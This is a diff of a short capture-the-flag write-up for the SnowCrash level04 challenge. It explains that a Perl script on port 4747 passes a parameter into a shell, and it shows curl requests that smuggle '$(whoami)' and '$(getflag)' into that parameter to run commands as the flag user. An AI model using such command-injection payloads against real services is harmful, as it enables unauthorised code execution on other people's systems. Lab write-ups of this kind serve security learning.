@@ -6,13 +6,9 @@ there is a perl script running on port 4747, which prints a parameter 'x'
 This can be checked using netstat -tul (tcp, udp, listening)
 this allows execution of a command passed as a parameter
 
-level04@SnowCrash:~$ curl localhost:4747?x="$(whoami)"
-level04
 level04@SnowCrash:~$ curl localhost:4747?x='$(whoami)'
 flag04
 
-or in a browser 
-http://10.11.200.127:4747/?x=\%27$(getflag)\%27
 
 using interpolated strings, we get to execute code by the flag user
 
